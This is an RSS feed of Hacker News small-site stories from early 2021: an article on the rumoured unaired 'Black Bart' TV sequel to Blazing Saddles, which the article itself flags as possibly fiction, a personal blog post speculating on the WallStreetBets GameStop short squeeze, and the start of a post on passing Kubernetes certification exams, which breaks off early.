<rss xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:content="http://purl.org/rss/1.0/modules/content/" xmlns:atom="http://www.w3.org/2005/Atom" version="2.0">
    <channel>
        <title>
<![CDATA[Hacker News - Small Sites - Score >= 1]]>
        </title>
        <description>
<![CDATA[Hacker News stories from domains that aren't in the top 1M and that have a score of at least 1. Updated nightly via https://github.com/awendland/hacker-news-small-sites]]>
        </description>
        <link>https://news.ycombinator.com</link>
        <generator>RSS for Node</generator>
        <lastBuildDate>Tue, 02 Feb 2021 12:48:12 GMT</lastBuildDate>
        <atom:link href="https://raw.githubusercontent.com/awendland/hacker-news-small-sites/generated/feeds/hn-small-sites-score-1.xml" rel="self" type="application/rss+xml"></atom:link>
        <pubDate>Tue, 02 Feb 2021 12:48:12 GMT</pubDate>
        <language>
<![CDATA[en-US]]>
        </language>
        <managingEditor>
<![CDATA[me@alexwendland.com (Alex Wendland)]]>
        </managingEditor>
        <ttl>240</ttl>
        <item>
            <title>
<![CDATA[Black Bart – The Buried TV Sequel to Blazing Saddles]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25977514">thread link</a>) | @rbanffy
<br/>
January 31, 2021 | https://reprobatepress.com/2021/01/30/black-bart-the-buried-tv-sequel-to-blazing-saddles/ | <a href="https://web.archive.org/web/*/https://reprobatepress.com/2021/01/30/black-bart-the-buried-tv-sequel-to-blazing-saddles/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="content">

	<section id="primary">
		<main id="main" role="main">

		
<article id="post-38544">

	
	
	
	<div>

		<p><img loading="lazy" src="https://i1.wp.com/reprobatepress.com/wp-content/uploads/2021/01/black-bart-blazing-saddles-tv-series-4.png?resize=840%2C606&amp;ssl=1" alt="" width="840" height="606" srcset="https://i1.wp.com/reprobatepress.com/wp-content/uploads/2021/01/black-bart-blazing-saddles-tv-series-4.png?w=850&amp;ssl=1 850w, https://i1.wp.com/reprobatepress.com/wp-content/uploads/2021/01/black-bart-blazing-saddles-tv-series-4.png?resize=300%2C216&amp;ssl=1 300w, https://i1.wp.com/reprobatepress.com/wp-content/uploads/2021/01/black-bart-blazing-saddles-tv-series-4.png?resize=768%2C554&amp;ssl=1 768w, https://i1.wp.com/reprobatepress.com/wp-content/uploads/2021/01/black-bart-blazing-saddles-tv-series-4.png?resize=840%2C606&amp;ssl=1 840w" sizes="(max-width: 840px) 100vw, 840px" data-recalc-dims="1" data-lazy-srcset="https://i1.wp.com/reprobatepress.com/wp-content/uploads/2021/01/black-bart-blazing-saddles-tv-series-4.png?w=850&amp;ssl=1 850w, https://i1.wp.com/reprobatepress.com/wp-content/uploads/2021/01/black-bart-blazing-saddles-tv-series-4.png?resize=300%2C216&amp;ssl=1 300w, https://i1.wp.com/reprobatepress.com/wp-content/uploads/2021/01/black-bart-blazing-saddles-tv-series-4.png?resize=768%2C554&amp;ssl=1 768w, https://i1.wp.com/reprobatepress.com/wp-content/uploads/2021/01/black-bart-blazing-saddles-tv-series-4.png?resize=840%2C606&amp;ssl=1 840w" data-lazy-src="https://i1.wp.com/reprobatepress.com/wp-content/uploads/2021/01/black-bart-blazing-saddles-tv-series-4.png?resize=840%2C606&amp;is-pending-load=1#038;ssl=1" data-old-srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"><em><strong>The Mel Brooks classic that became a TV series that ran for four seasons without being broadcast anywhere.</strong></em></p>

<p><em>Update: large parts of this story may, in fact, be fiction. See the addendum at the end for details.</em></p>
<p>Film rights are a strange and complex thing, especially when it comes to existing properties. The contracts for these things can involve a labyrinthine series of clauses and negotiations, where the owners of the original property want to include cut-off clauses that will enable them to claw back the rights and sell them again, possibly for much more money if the adaptation has been a success, the artistic creator wants to hold on to some level of creative control and the film studio wants to ensure that neither of those things happens. We’ve seen assorted shenanigans at work across the board – the <a href="https://reprobatepress.com/2018/08/30/big-bond-themes-and-secret-agent-cover-versions/">James Bond</a> copyright snafu that saw the film rights for <strong>Casino Royale</strong> owned and exploited by another company than the one that made the official series, and perhaps most famously in terms of contractual obligations, the first <strong>Fantastic Four</strong> movie, made as a low-budget throwaway affair simply to ensure that the film rights stayed with Constantin Film, who was not quite ready to make a ‘proper’ version of the story but who saw the potential in the property and didn’t want to let it go.</p>
<p>But perhaps the most absurd of these contractual obligation projects came with <strong>Blazing Saddles</strong>, which was adapted into a TV series that ran for four seasons – which would suggest a major hit show by 1970s television standards, except for the fact that it never aired. Not a single episode beyond the pilot was shown on TV anywhere.</p>
<p><strong>Blazing Saddles</strong> was a major hit in 1974 and remains one of the most beloved Hollywood comedies – well, perhaps not with Millenials and Generation Z, given the film’s rather liberal use of the sort of racist language that is now strictly forbidden, even in context. Mel Brooks’ comedy western mocked American racism brutally – perhaps a little too brutally in the use of one particular word, which is bandied about throughout the film. It was a different time.</p>
<p><img loading="lazy" src="https://i1.wp.com/reprobatepress.com/wp-content/uploads/2021/01/black-bart-blazing-saddles-tv-series-3.png?resize=840%2C605&amp;ssl=1" alt="" width="840" height="605" srcset="https://i1.wp.com/reprobatepress.com/wp-content/uploads/2021/01/black-bart-blazing-saddles-tv-series-3.png?w=850&amp;ssl=1 850w, https://i1.wp.com/reprobatepress.com/wp-content/uploads/2021/01/black-bart-blazing-saddles-tv-series-3.png?resize=300%2C216&amp;ssl=1 300w, https://i1.wp.com/reprobatepress.com/wp-content/uploads/2021/01/black-bart-blazing-saddles-tv-series-3.png?resize=768%2C553&amp;ssl=1 768w, https://i1.wp.com/reprobatepress.com/wp-content/uploads/2021/01/black-bart-blazing-saddles-tv-series-3.png?resize=840%2C605&amp;ssl=1 840w" sizes="(max-width: 840px) 100vw, 840px" data-recalc-dims="1" data-lazy-srcset="https://i1.wp.com/reprobatepress.com/wp-content/uploads/2021/01/black-bart-blazing-saddles-tv-series-3.png?w=850&amp;ssl=1 850w, https://i1.wp.com/reprobatepress.com/wp-content/uploads/2021/01/black-bart-blazing-saddles-tv-series-3.png?resize=300%2C216&amp;ssl=1 300w, https://i1.wp.com/reprobatepress.com/wp-content/uploads/2021/01/black-bart-blazing-saddles-tv-series-3.png?resize=768%2C553&amp;ssl=1 768w, https://i1.wp.com/reprobatepress.com/wp-content/uploads/2021/01/black-bart-blazing-saddles-tv-series-3.png?resize=840%2C605&amp;ssl=1 840w" data-lazy-src="https://i1.wp.com/reprobatepress.com/wp-content/uploads/2021/01/black-bart-blazing-saddles-tv-series-3.png?resize=840%2C605&amp;is-pending-load=1#038;ssl=1" data-old-srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></p>
<p>Brooks was on fire as a filmmaker in 1974, and there was every reason to expect <strong>Blazing Saddles</strong> to be a massive hit, as indeed it was. Having dealt with studios enough by this point, Brooks knew that they might want to take the project away from him and produce sequels – the story essentially opened itself up for on-going narratives. And so he came up with a cunning plan. The contracts for the film stated that there could only be film sequels if a TV series follow-up was made within six months. Brooks and his legal team were pretty certain that the film was too profane and vulgar to ever be adapted as a TV series. I mean, what could they do? Strip it back to its most basic elements while throwing out everything that made the film what it was?</p>
<p>Well, that was precisely what happened. In 1977, Warner Brothers announced plans for a sequel film – in fact, a series of sequels – to <strong>Blazing Saddles</strong>, and when Brooks and his lawyers waved the contract at them, they pulled their ace card – a four-season series based on the original film that had gone into production very quickly in 1974. As Brooks explained, <em>“Warner Bros comes to me and says they want to make another Blazing Saddles, and I say, ‘No. You don’t have the right to do that.’ They say, ‘Yes we do, we’ve been making a TV series and still control the rights.’ What TV series? I haven’t seen a TV show. They take me onto the lot, into a projection booth, and show me three episodes. My lawyers never thought to put in language that said they had to air the damn thing, only that they had to make it.”</em></p>
<p>You have to almost admire Warner Brothers’ gall here, and – oddly – their belief in <strong>Blazing Saddles</strong>. Not only did they rush a series into production in 1974, but they kept it in production – because the contract only allowed a new movie within six months of the last <strong>Blazing Saddles</strong> project – for four years until they finally had a movie ready. TV shows might be cheaper than films, but nevertheless, imagine how much they had to spend, making four seasons of a show just to hold onto the film rights.</p>
<p>In fact, the pilot episode of <strong>Black Bart</strong>, as the series is called, was shown once in 1975 on CBS, with no one even noticing. Well, why would they? As well as changing the title (because the contract also failed to state that any TV series be <em>called</em> <strong>Blazing Saddles</strong>), Brooks wasn’t credited, with Andrew Bergman, who originally came up with the <strong>Blazing Saddles</strong> idea listed as creator. The show starred Louis Gossett Jr as Sheriff Bart, continuing his battles against both criminals and racists, while the other film characters were replaced with similar, but not identical characters to avoid crediting Brooks. Both the cast – including Gerrit Graham – and the characters are lightweight versions of the originals, the humour is almost non-existent and the laugh track just hammers home how unfunny the show is. And yet it is a professional work, and arguably no less forced than several other sitcoms of the era. So the question is: why didn’t they just put in a bit more effort and then show the damn thing instead of paying everyone to shoot twenty-four episodes that would sit, unseen, in the Warner Brothers vaults?</p>
<p><img loading="lazy" src="https://i2.wp.com/reprobatepress.com/wp-content/uploads/2021/01/black-bart-blazing-saddles-tv-series-2.png?resize=840%2C602&amp;ssl=1" alt="" width="840" height="602" srcset="https://i2.wp.com/reprobatepress.com/wp-content/uploads/2021/01/black-bart-blazing-saddles-tv-series-2.png?w=850&amp;ssl=1 850w, https://i2.wp.com/reprobatepress.com/wp-content/uploads/2021/01/black-bart-blazing-saddles-tv-series-2.png?resize=300%2C215&amp;ssl=1 300w, https://i2.wp.com/reprobatepress.com/wp-content/uploads/2021/01/black-bart-blazing-saddles-tv-series-2.png?resize=768%2C550&amp;ssl=1 768w, https://i2.wp.com/reprobatepress.com/wp-content/uploads/2021/01/black-bart-blazing-saddles-tv-series-2.png?resize=840%2C602&amp;ssl=1 840w" sizes="(max-width: 840px) 100vw, 840px" data-recalc-dims="1" data-lazy-srcset="https://i2.wp.com/reprobatepress.com/wp-content/uploads/2021/01/black-bart-blazing-saddles-tv-series-2.png?w=850&amp;ssl=1 850w, https://i2.wp.com/reprobatepress.com/wp-content/uploads/2021/01/black-bart-blazing-saddles-tv-series-2.png?resize=300%2C215&amp;ssl=1 300w, https://i2.wp.com/reprobatepress.com/wp-content/uploads/2021/01/black-bart-blazing-saddles-tv-series-2.png?resize=768%2C550&amp;ssl=1 768w, https://i2.wp.com/reprobatepress.com/wp-content/uploads/2021/01/black-bart-blazing-saddles-tv-series-2.png?resize=840%2C602&amp;ssl=1 840w" data-lazy-src="https://i2.wp.com/reprobatepress.com/wp-content/uploads/2021/01/black-bart-blazing-saddles-tv-series-2.png?resize=840%2C602&amp;is-pending-load=1#038;ssl=1" data-old-srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></p>
<p>Presumably, the answer is that a TV show – even a good TV show – would have diluted the appeal of another film. The 1970s were a different time (we mentioned that, right?) and there was less crossover of film and TV – sure, some films – like <a href="https://reprobatepress.com/2020/09/27/go-ape-the-planet-of-the-apes-book-and-comics-of-the-1970s/"><strong>Planet of the Apes</strong></a> – were adapted into TV shows, but those shows were rarely successful and were seen as having essentially killed off any chance of audiences then going to the cinema to watch a movie version. If anything, <strong>Black Bart</strong> might have served as a sign of just how bad a Mel Brooks-free version of <strong>Blazing Saddles</strong> could be. So instead of putting any effort into making a decent TV series based on the property (and there’s certainly the potential there), Warner Brothers simply put the least possible effort into making something that would still legally stand up as a TV show that could, in theory, be broadcast – and then buried it.</p>
<p>What the cast and crew thought of all this is hard to gauge – Gossett has talked about the weirdness of it all, but you have to wonder just how anyone managed to drum up any enthusiasm once it became clear that the show would never air. Ironically, the plans for a <strong>Blazing Saddles</strong> sequel ultimately went nowhere – by 1979, it was clear that the moment had passed and audience tastes had changed. The sequel was shelved, and the series was finally cancelled. The pilot episode has since turned up on the <strong>Blazing Saddles</strong> DVD and blu-ray, but the other episodes have yet to be seen. It’s entirely possible that they were never even completed beyond the ones shown to Brooks, and may have been trashed. A pity, as we’ll never know if it accidentally improved.</p>
<p><strong>IMPORTANT UPDATE:</strong> We feel it’s important to point out that some sources are claiming since we originally posted this that the entire story – with the exception of the<strong> Black Bart</strong> pilot, which definitely exists and is perhaps a weird enough thing in itself – is in fact a spoof that has somehow become accepted as reality – ‘fake news’, as I believe it is known. There are several sources online claiming that this story is authentic; others claiming that it is satire (links appear in the comments). Unless Mel Brooks – or perhaps Louis Gossett – wants to come clean on the actual facts, it perhaps remains a mystery. Stranger-than-fiction may, or may not, be actual fiction, and isn’t that depressing when it’s a story as good as this? As Tony Wilson said (or possibly didn’t say, there’s the rub), <em>“when&nbsp;you have to choose between the truth and the legend, choose the legend.”</em></p>
<p>DAVID FLINT</p>
<p><em><strong>Help support The Reprobate:</strong></em></p>
<p><em><strong><a href="https://www.buymeacoffee.com/reprobatepress" target="_blank" rel="noopener noreferrer"><img loading="lazy" src="https://i0.wp.com/reprobatepress.com/wp-content/uploads/2020/06/buy-me-a-beer.png?resize=199%2C59&amp;ssl=1" alt="buy-me-a-beer" width="199" height="59" data-recalc-dims="1" data-lazy-src="https://i0.wp.com/reprobatepress.com/wp-content/uploads/2020/06/buy-me-a-beer.png?resize=199%2C59&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></a><br>
<a href="https://www.patreon.com/reprobatepress" target="_blank" rel="noopener noreferrer"><img loading="lazy" src="https://i1.wp.com/reprobatepress.com/wp-content/uploads/2020/03/Patreon_White_on_Navy.jpg?resize=567%2C283&amp;ssl=1" alt="Patreon" width="567" height="283" srcset="https://i1.wp.com/reprobatepress.com/wp-content/uploads/2020/03/Patreon_White_on_Navy.jpg?w=567&amp;ssl=1 567w, https://i1.wp.com/reprobatepress.com/wp-content/uploads/2020/03/Patreon_White_on_Navy.jpg?resize=300%2C150&amp;ssl=1 300w" sizes="(max-width: 567px) 100vw, 567px" data-recalc-dims="1" data-lazy-srcset="https://i1.wp.com/reprobatepress.com/wp-content/uploads/2020/03/Patreon_White_on_Navy.jpg?w=567&amp;ssl=1 567w, https://i1.wp.com/reprobatepress.com/wp-content/uploads/2020/03/Patreon_White_on_Navy.jpg?resize=300%2C150&amp;ssl=1 300w" data-lazy-src="https://i1.wp.com/reprobatepress.com/wp-content/uploads/2020/03/Patreon_White_on_Navy.jpg?resize=567%2C283&amp;is-pending-load=1#038;ssl=1" data-old-srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></a></strong></em></p>


		
	</div><!-- .entry-content -->

	<!-- .entry-footer -->

</article>

	<!-- #comments -->


		</main><!-- #main -->
	</section><!-- #primary -->

	
	<!-- #secondary -->



	</div></div>]]>
            </description>
            <link>https://reprobatepress.com/2021/01/30/black-bart-the-buried-tv-sequel-to-blazing-saddles/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25977514</guid>
            <pubDate>Sun, 31 Jan 2021 09:42:19 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[WallStreetBets vs. Wall Street and the Populist Rebellion]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25977022">thread link</a>) | @lettergram
<br/>
January 30, 2021 | https://austingwalters.com/wallstreetbets-vs-wall-street-and-the-populist-rebellion/ | <a href="https://web.archive.org/web/*/https://austingwalters.com/wallstreetbets-vs-wall-street-and-the-populist-rebellion/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article id="post-3831">

<div>
<p>I have been engaging with WSB (<a href="https://www.reddit.com/r/wallstreetbets/" target="_blank" rel="noopener">/r/WallStreetBets</a>) since 2014.</p>
<p>Every regular person on WSB understands it’s a game. You can loose it all, make it big, sometimes both in the same day — it’s all a game. The most accurate assessment of WSB culture was clearly:</p>
<blockquote><p>Like 4chan found a Bloomberg Terminal.</p></blockquote>
<p>While the influx of new users may change the community, prior to January 15, 2021 the above was indeed an accurate description.</p>

<p>Honestly, this world feels like we are in a simulation. The company GameStop appears to be poised to bring down the entire financial system — stopping the game.</p>
<p>The infinity squeeze appears to be coming, what is an infinity squeeze you ask? It’s a really massive short squeeze:</p>
<blockquote><p>A short squeeze occurs when a stock or other asset jumps sharply higher, forcing traders who had bet that its price would fall, to buy it in order to forestall even greater losses. Their scramble to buy only adds to the upward pressure on the stock’s price.</p></blockquote>
<p>Short positions can technically lead to infinite losses. Simply put, if I open a short position for $10 and the share price drops 10%, I make $1. However, if the stock price increases say 10,000% I now owe $1,000.</p>
<p>In the case of GameStop, the situation appears dire. At one point the short positions were 140% of available shares of the market. This means that more shares were lent out than were available on float, i.e. shorts were resold / lent several times. At this point, several things are happening[<a href="https://www.investopedia.com/ask/answers/05/shortsaleclosed.asp" target="_blank" rel="noopener">1</a>]:</p>
<ul>
<li>Those holding short positions are paying ridiculously high interest rates</li>
<li>If the short positions were forced to close, it would cause a major loss to multiple hedge funds (tens of billions total &amp; bankrupcies)</li>
<li>Due to the level of shorting, exiting the short positions would be excessively expensive and cause a <a href="https://www.investopedia.com/terms/s/shortsqueeze.asp" target="_blank" rel="noopener">short squeeze</a></li>
<li>There is less GameStop stock available for purchase</li>
<li>The price of GameStop stock is rising</li>
</ul>
<p>As a result, it appears to me that:</p>
<ul>
<li>Short holders cannot exit their positions without going bankrupt</li>
<li>Short holders are being hit by high interest rates</li>
<li>Closing other positions in the stock market should help them cover the interest rates</li>
<li>Best option for short position holders is is to wait &amp; pray the stock price drops</li>
<li>What happens if not enough people are willing to sell?</li>
</ul>
<p>Personally, I believe all of this will suck all the liquidity from the stock market. Either those shorting suffer the loss and close their positions or wait as the stock continues to stay high… in either case hundreds of billions of dollars is leaving the market.</p>
<p>How did we get here?</p>
<h3>Infinity Squeeze – Short Positions</h3>
<p>There’s a lot to this story I’ll come back an fill in, but the gist is this — In mid-January 2021 GameStop was <em>extremely</em> shorted.</p>
<figure id="attachment_3832" aria-describedby="caption-attachment-3832"><a href="https://austingwalters.com/wp-content/uploads/2021/01/Screenshot-from-2021-01-31-00-01-17.png"><img loading="lazy" src="https://austingwalters.com/wp-content/uploads/2021/01/Screenshot-from-2021-01-31-00-01-17.png" alt="" width="424" height="417" srcset="https://austingwalters.com/wp-content/uploads/2021/01/Screenshot-from-2021-01-31-00-01-17.png 424w, https://austingwalters.com/wp-content/uploads/2021/01/Screenshot-from-2021-01-31-00-01-17-300x295.png 300w" sizes="(max-width: 424px) 100vw, 424px" data-old-src="//austingwalters.com/wp-content/plugins/a3-lazy-load/assets/images/lazy_placeholder.gif" data-src="https://austingwalters.com/wp-content/uploads/2021/01/Screenshot-from-2021-01-31-00-01-17.png" data-srcset="https://austingwalters.com/wp-content/uploads/2021/01/Screenshot-from-2021-01-31-00-01-17.png 424w, https://austingwalters.com/wp-content/uploads/2021/01/Screenshot-from-2021-01-31-00-01-17-300x295.png 300w"></a><figcaption id="caption-attachment-3832">Courtesy of <a href="https://finance.yahoo.com/quote/GME/key-statistics?p=GME" target="_blank" rel="noopener">Yahoo Finance</a></figcaption></figure>
<p>The massive short position and didn’t go unnoticed, WSB had been <a href="https://web.archive.org/web/20201222153244/https://old.reddit.com/r/wallstreetbets/" target="_blank" rel="noopener">discussing it for months</a>. That being said, the massive spikes in purchases did not start until January 12:</p>
<p><a href="https://austingwalters.com/wp-content/uploads/2021/01/Screenshot-from-2021-01-31-00-05-15.png"><img loading="lazy" src="https://austingwalters.com/wp-content/uploads/2021/01/Screenshot-from-2021-01-31-00-05-15.png" alt="" width="916" height="411" srcset="https://austingwalters.com/wp-content/uploads/2021/01/Screenshot-from-2021-01-31-00-05-15.png 916w, https://austingwalters.com/wp-content/uploads/2021/01/Screenshot-from-2021-01-31-00-05-15-300x135.png 300w, https://austingwalters.com/wp-content/uploads/2021/01/Screenshot-from-2021-01-31-00-05-15-768x345.png 768w" sizes="(max-width: 916px) 100vw, 916px" data-old-src="//austingwalters.com/wp-content/plugins/a3-lazy-load/assets/images/lazy_placeholder.gif" data-src="https://austingwalters.com/wp-content/uploads/2021/01/Screenshot-from-2021-01-31-00-05-15.png" data-srcset="https://austingwalters.com/wp-content/uploads/2021/01/Screenshot-from-2021-01-31-00-05-15.png 916w, https://austingwalters.com/wp-content/uploads/2021/01/Screenshot-from-2021-01-31-00-05-15-300x135.png 300w, https://austingwalters.com/wp-content/uploads/2021/01/Screenshot-from-2021-01-31-00-05-15-768x345.png 768w"></a></p>
<p>What happened at that time? The <a href="https://web.archive.org/web/20210118091858/https://old.reddit.com/r/wallstreetbets/comments/kxeq23/gme_yolo_update_jan_14_2021/" target="_blank" rel="noopener">YOLO updates</a> definitely started at that time and stocks started to rise. Once the stocks started to rise, I believe institutions and WSB itself started piling into GameStop. The stock started to move and if they could get in they could make a boat load. It’s important to remember WSB is often visited by hedge fund mangers, CEOs, day traders big and small, etc. It’s not always the little guy(s). When they piled in, the price started to rise further.</p>
<h3>Infinity Squeeze – Let’s Make Money</h3>
<p>As they purchased, I personally believe some short sellers managed to exit their positions (about 7m shares, per Yahoo Finance data)</p>
<p><a href="https://austingwalters.com/wp-content/uploads/2021/01/Screenshot-from-2021-01-31-00-01-17-highlighted.png"><img loading="lazy" src="https://austingwalters.com/wp-content/uploads/2021/01/Screenshot-from-2021-01-31-00-01-17-highlighted.png" alt="" width="424" height="417" srcset="https://austingwalters.com/wp-content/uploads/2021/01/Screenshot-from-2021-01-31-00-01-17-highlighted.png 424w, https://austingwalters.com/wp-content/uploads/2021/01/Screenshot-from-2021-01-31-00-01-17-highlighted-300x295.png 300w" sizes="(max-width: 424px) 100vw, 424px" data-old-src="//austingwalters.com/wp-content/plugins/a3-lazy-load/assets/images/lazy_placeholder.gif" data-src="https://austingwalters.com/wp-content/uploads/2021/01/Screenshot-from-2021-01-31-00-01-17-highlighted.png" data-srcset="https://austingwalters.com/wp-content/uploads/2021/01/Screenshot-from-2021-01-31-00-01-17-highlighted.png 424w, https://austingwalters.com/wp-content/uploads/2021/01/Screenshot-from-2021-01-31-00-01-17-highlighted-300x295.png 300w"></a></p>
<p>What this indicates to me is that many of those holding short positions did not realize what was about to happen. They kept holding believing this was a classic pump-and-dump. Even WSB at the time didn’t not necessarily think about much <a href="https://web.archive.org/web/20210115023914/https://old.reddit.com/r/wallstreetbets/" target="_blank" rel="noopener">besides making money</a>. I know I even purchased call options during this week, particularly when the new data came out January 15, 2021. To me, it became clear the stock was about to rocket.</p>
<h3>Infinity Squeeze – Let’s Stick it to the Man</h3>
<p>In light of the massive number of short position(s) open in January 15, 2021, WSB realized they could (a) make money and (b) stick it to the hedge funds. Frankly, WSB have been waging a war on short selling for years. With GameStop they had a company with relatively few shares&nbsp; in float (47m), a low market cap, basically something that purchases would have an outsized impact.</p>
<p>I’m not 100% sure this was intentional, but as people started buying and holding waiting for the squeeze the stock started to rise.The rising stock both led to discussions on news outlets and the stock started going viral on social media platforms outside of WSB – further raising the going rate for a share of GameStop.</p>
<p>Those holding short positions did not want to sell as they’d lose money, so they were searching for capital to cover their leveraged positions. Citadel and Point72 partners appears to have <a href="https://www.wsj.com/articles/citadel-point72-to-invest-2-75-billion-into-melvin-capital-management-11611604340" target="_blank" rel="noopener">come to at least one short sellers aid</a>. This showed they were weak and further emboldened the WSB folks – “Let’s make some money on the hedge funds behalf”</p>
<p>Purchases from Jan 19 to Jan 23, 2021 and the stock price increased exponentially as it went viral:</p>
<p><a href="https://austingwalters.com/wp-content/uploads/2021/01/Screenshot-from-2021-01-31-00-46-17.png"><img loading="lazy" src="https://austingwalters.com/wp-content/uploads/2021/01/Screenshot-from-2021-01-31-00-46-17.png" alt="" width="507" height="423" srcset="https://austingwalters.com/wp-content/uploads/2021/01/Screenshot-from-2021-01-31-00-46-17.png 507w, https://austingwalters.com/wp-content/uploads/2021/01/Screenshot-from-2021-01-31-00-46-17-300x250.png 300w" sizes="(max-width: 507px) 100vw, 507px" data-old-src="//austingwalters.com/wp-content/plugins/a3-lazy-load/assets/images/lazy_placeholder.gif" data-src="https://austingwalters.com/wp-content/uploads/2021/01/Screenshot-from-2021-01-31-00-46-17.png" data-srcset="https://austingwalters.com/wp-content/uploads/2021/01/Screenshot-from-2021-01-31-00-46-17.png 507w, https://austingwalters.com/wp-content/uploads/2021/01/Screenshot-from-2021-01-31-00-46-17-300x250.png 300w"></a></p>
<h3>Infinity Squeeze – The Rebellion</h3>
<p>On January 27, 2021 across the board buying for GameStop was <a href="https://www.clickondetroit.com/money/2021/01/27/robinhood-td-ameritrade-other-brokerages-have-tech-problems-at-market-open/" target="_blank" rel="noopener">restricted (along with multiple other stocks) across various trading platforms</a>. This effectively forced purchase volume lower and as users of these platforms could only sell it drove down the share price. This likely startled many GameStop shareholds and many liquidated their positions, letting the short sellers exit some of their positions. Through January 29, 2021 the ability to purchase in an unrestricted manner has not been restored.</p>
<p>What happened?</p>
<p>Personally, I’m of the opinion that there was not enough shares to go around and likely these platforms colluded to drive down the stock price. What’s more interesting is how few people sold. As of January 29, 2021 the price of a GameStop share was back at $325. This has led to some very VERY strong backlash and I know I’ll be joining a lawsuit at some point (if not filing my own), as this collusion cost me tens to hundreds of thousands of dollars.</p>
<p>One essay that particularly struck me was made on WSB: <a href="https://web.archive.org/web/20210130034124/https://www.reddit.com/r/wallstreetbets/comments/l6omry/an_open_letter_to_melvin_capital_cnbc_boomers_and/" target="_blank" rel="noopener">An Open Letter to Melvin Capital, CNBC, Boomers, and WSB</a></p>
<p>I recommend reading the comments on this essay to really get an under standing of what’s happening. Look at the charts. This is personal now. The market manipulation is obvious and people want revenge. For the current events, for 2008, for the entire corrupt system. They want to send a message. This is a protest.</p>
<p><a href="https://austingwalters.com/wp-content/uploads/2021/01/vymOZEhH.jpg"><img loading="lazy" src="https://austingwalters.com/wp-content/uploads/2021/01/vymOZEhH.jpg" alt="" width="474" height="567" srcset="https://austingwalters.com/wp-content/uploads/2021/01/vymOZEhH.jpg 474w, https://austingwalters.com/wp-content/uploads/2021/01/vymOZEhH-251x300.jpg 251w" sizes="(max-width: 474px) 100vw, 474px" data-old-src="//austingwalters.com/wp-content/plugins/a3-lazy-load/assets/images/lazy_placeholder.gif" data-src="https://austingwalters.com/wp-content/uploads/2021/01/vymOZEhH.jpg" data-srcset="https://austingwalters.com/wp-content/uploads/2021/01/vymOZEhH.jpg 474w, https://austingwalters.com/wp-content/uploads/2021/01/vymOZEhH-251x300.jpg 251w"></a>Many retail investors will hold until the bitter end.</p>
<h3>Infinity Squeeze – End Game</h3>
<p>So what happens next?</p>
<ul>
<li>Starting on January 27-29 people were trying to transfer funds off Robinhood and the other platforms which disabled purchasing of GameStop shares.</li>
<li>Come the <span>first week of February</span> these assets will be again available and can be used to purchase GameStop shares.</li>
<li>Everyone saw much fewer shares being traded Friday</li>
<li>Everyone is talking with their families</li>
<li>People are going to purchase more GameStop shares &amp; hold</li>
<li>I expect many are going to pull their assets out of the stock market</li>
</ul>
<p>There are some unknowns, for instance have the short positions been closed? Have there been backroom deals to stave off the infinity squeeze?</p>
<p>If neither of those assumptions above hold, then what happens when the price rises further and there’s not enough shares for sale?</p>
<p>Hedge funds either bleed out as they pay the massive interest rates on holding those short positions or they will close their short positions causing an infinity squeeze (GameStop shares will be priced in the thousands). In either case hundreds of billions would likely leave the market.</p>
<h3>Conclusion – The Black Hole</h3>
<p>It’s a <a href="https://en.wikipedia.org/wiki/Nash_equilibrium" target="_blank" rel="noopener">Nash Equilibrium</a>, essentially the share holders have every reason to ask the maximum amount they can get for a share of GameStop (i.e. make money). If for some reason these GameStop share holders are unwilling to sell at a low rate, then these hedge funds stand to lose hundreds of billions and will go bankrupt (slowly via interest payments or quickly via short squeeze). To try and pay for their debts, they’ll have to sell off market wide and the entire market collapses.</p>
<p>There are three ways to alleviate the issue:</p>
<ul>
<li>GameStop issues a massive number of new shares</li>
<li>Market manipulation (such as Robinood and friends only enabling selling – of course that didn’t work last time)</li>
<li>Government settles the matter by confiscating shares</li>
</ul>
<p>Personally, I view government involvement as inevitable. They could settle everyone accounts fairly by giving everyone the current share price or what they bought it for, which every is higher. That being said, I suspect the more likely course of action is some flat rate $100/share or something to that effect. In either case, if they don’t get involved, I suspect the system really will collapse.</p>
<p>Unless of course, I am wrong. I am not a financial expert and nothing in this article should be taken as advice.</p>
<p>It’s completely possible I’m inaccurately reading the situation and those shorting GameStop have already exited their position(s) and GameStop is currently just in a classic bubble.</p>

</div>

</article></div>]]>
            </description>
            <link>https://austingwalters.com/wallstreetbets-vs-wall-street-and-the-populist-rebellion/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25977022</guid>
            <pubDate>Sun, 31 Jan 2021 07:57:33 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[My experience passing CKA and CKAD]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25976625">thread link</a>) | @micuffaro
<br/>
January 30, 2021 | https://blog.cuffaro.com/blog/2021/01/24/cka-ckad | <a href="https://web.archive.org/web/*/https://blog.cuffaro.com/blog/2021/01/24/cka-ckad">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
            <p>In December last year I was able to sit for the coveted Certified Kubernetes Administrator and Certified Kubernetes Application Developer exams, and clear them both after some preparation.</p>

<p>This post is meant to share my exam experience, and all the materials used.</p>

<h3 id="tldr">TL;DR</h3>
<ul>
  <li>Read the exam questions carefully.</li>
  <li>Know imperative commands with <code>kubectl</code> like the back of your hand.</li>
  <li>Get comfortable looking things up on <a href="https://kubernetes.io/">kubernetes.io</a>.</li>
